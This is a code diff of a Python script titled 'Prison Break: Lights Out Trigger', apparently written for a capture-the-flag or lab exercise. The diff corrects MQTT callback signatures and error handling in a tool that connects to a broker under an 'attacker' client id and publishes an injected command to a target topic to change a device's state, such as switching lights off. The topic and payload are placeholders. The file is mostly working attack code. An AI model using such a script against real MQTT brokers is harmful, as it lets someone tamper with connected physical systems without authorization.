@@ -26,27 +26,29 @@ def on_connect(client, userdata, flags, rc, properties=None):
         # Immediately try to publish after connecting
         publish_command(client)
     else:
-        print(f"[!] MQTT Connection failed with code {rc}. Check broker details and credentials.")
+        print(f"[!] MQTT Connection failed with code {rc} ({mqtt.connack_string(rc)}). Check broker details and credentials.")
         try:
              client.disconnect()
-             client.loop_stop() # Stop loop if connect fails
+             client.loop_stop()
         except Exception:
              pass
-        sys.exit(1) # Exit script if connection fails
+        sys.exit(1)
 
-def on_publish(client, userdata, mid):
+# *** MODIFIED on_publish signature ***
+def on_publish(client, userdata, mid, rc, properties=None):
     """Callback when publish completes (for QoS > 0)."""
-    print(f"[+] Command '{COMMAND_PAYLOAD}' successfully published to '{TARGET_TOPIC}' (MID: {mid}).")
+    # The 'rc' argument indicates success (0) or failure for the publish acknowledgement (MQTTv5)
+    # Note: For QoS 0, this callback might not fire reliably. For QoS 1/2, it confirms PUBACK/PUBREC.
+    # For simplicity here, we just check mid and assume success if called. A production app might check rc.
+    print(f"[+] Command '{COMMAND_PAYLOAD}' publish acknowledged by broker (MID: {mid}, RC: {rc}).")
     print("[*] Check the hidden website for status change!")
-    # Disconnect after successful publish
-    time.sleep(0.5) # Short delay to ensure message is likely sent by broker
+    # Disconnect after successful publish acknowledgement
+    time.sleep(0.5) # Short delay
     client.disconnect() # This will eventually stop loop_forever
 
-# Corrected on_disconnect signature and fixed indentation inside
+# Corrected on_disconnect signature
 def on_disconnect(client, userdata, rc, properties=None):
     """Callback for disconnections."""
-    # This is called both on intentional disconnect and errors
-    # *** FIXED INDENTATION HERE ***
     if rc == 0:
         print("[*] MQTT connection closed gracefully.")
     else:
@@ -58,12 +60,12 @@ def publish_command(client):
      """Publishes the command payload to the target topic."""
      print(f"[*] Sending command '{COMMAND_PAYLOAD}' to topic '{TARGET_TOPIC}'...")
      try:
-         # Use QoS 1 to make it more likely the broker receives it
+         # Use QoS 1 to make it more likely the broker receives it and on_publish is called
          result, mid = client.publish(TARGET_TOPIC, payload=COMMAND_PAYLOAD, qos=1)
          if result != mqtt.MQTT_ERR_SUCCESS:
-             print(f"[!] Failed to publish command. Error code: {result}")
+             print(f"[!] Failed to queue publish command locally. Error code: {result}")
              client.disconnect() # Disconnect on publish failure
-         # Success is handled by on_publish callback
+         # Actual success confirmed by on_publish callback
      except Exception as e:
          print(f"[!] Error publishing command: {e}")
          client.disconnect()
@@ -73,7 +75,6 @@ def publish_command(client):
 if __name__ == "__main__":
     print("--- Prison Break: Lights Out Trigger ---")
 
-    # Basic check if placeholders were edited
     if "CHANGE_ME" in TARGET_TOPIC or "CHANGE_ME" in COMMAND_PAYLOAD:
         print("\n[ERROR] Please edit the script first!")
         print("        Replace the placeholder values for TARGET_TOPIC and COMMAND_PAYLOAD")
@@ -83,12 +84,9 @@ if __name__ == "__main__":
     print(f"[*] Target Topic:     {TARGET_TOPIC}")
     print(f"[*] Command Payload:  {COMMAND_PAYLOAD}")
 
-    # Use the correct callback API version
     try:
-        # Specify V2 explicitly for newer paho-mqtt
         client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"attacker-lightsout-{time.time()}")
     except AttributeError:
-        # Fallback to V1 if V2 is not available (older paho-mqtt)
         print("[INFO] Using older MQTT Callback API Version 1.")
         client = mqtt.Client(client_id=f"attacker-lightsout-{time.time()}")
 
@@ -102,9 +100,7 @@ if __name__ == "__main__":
     try:
         print(f"[*] Connecting to broker {BROKER_HOST}:{BROKER_PORT}...")
         client.connect(BROKER_HOST, BROKER_PORT, 60)
-
-        # loop_forever() will block until disconnect is called (e.g., in callbacks)
-        client.loop_forever()
+        client.loop_forever() # Blocks until disconnect
 
     except ConnectionRefusedError:
          print(f"\n[!] ERROR: Connection refused. Broker might be down or inaccessible.")
